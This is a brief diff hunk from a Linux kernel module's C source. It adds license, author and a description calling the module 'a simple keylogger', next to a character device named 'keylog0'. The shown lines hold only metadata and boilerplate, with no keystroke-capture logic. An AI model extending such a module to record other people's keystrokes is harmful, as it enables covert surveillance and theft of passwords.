@@ -5,6 +5,10 @@
 #include <linux/uaccess.h>
 #include <linux/notifier.h>
 
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Nurkanat");
+MODULE_DESCRIPTION("A simple keylogger module");
+
 // Module Info
 #define DEVICE_NAME "keylog0"  // The Device name for our Device Driver
 static int major;  // The Major Number that will be assigned to our Device Driver
